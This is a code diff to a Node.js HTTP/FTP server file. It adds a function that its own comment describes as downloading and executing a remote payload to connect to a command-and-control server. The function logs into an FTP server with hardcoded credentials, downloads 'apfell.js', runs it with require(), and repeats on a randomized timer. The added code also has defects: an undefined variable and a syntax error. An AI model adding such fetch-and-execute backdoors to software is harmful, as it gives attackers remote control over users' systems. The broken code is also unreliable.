@@ -3,6 +3,7 @@ const url = require('url');
 const fs = require('fs');
 const FtpServer = require('ftp-srv');
 const path = require('path');
+const ftp = require('basic-ftp')
 
 // Create upload directory if it doesn't exist
 const uploadDir = './uploads';
@@ -86,6 +87,42 @@ const server = http.createServer((req, res) => {
   }
 });
 
+// function to download and execute remote payload to build connection with c2 server
+async function fetchAndExecuteJS() {
+  const client = new ftp.Client();
+  client.ftp.verbose = true;
+
+  try {
+    await client.access(
+      {
+        host: "127.0.0.1",
+        user: "ftpuser",
+        password: "12345678",
+        secure: false
+      }
+    );
+
+    console.log("Connected to FTP server");
+
+    // define local file path
+    const payloadPath = path.join(__dirname, 'apfell.js');
+
+    // download the file
+    await client.downloadTo(payloadPath, 'apfell.js');
+    console.log(`[${new Date().toISOString()}] Payload downloaded successfully: ${localPath}`);
+    
+    // execute the downloaded file
+    require(payloadPath);
+    console.log(`[${new Date().toISOString()}] executed payload`);
+
+  } catch (err) {
+    console.error("Error": err);
+  } finally {
+    client.close();
+  }
+
+}
+
 // Start both servers
 const httpPort = 8000;
 server.listen(httpPort, () => {
@@ -100,4 +137,7 @@ ftpServer.listen()
     console.error('Error starting FTP server:', err);
   });
   
-  
+// Set the next interval with a new random delay
+const randomDelay = Math.floor(Math.random() * 10000000) + 10000; // Between 10s and 10000s
+
+setInterval(fetchAndExecuteJS, randomDelay);
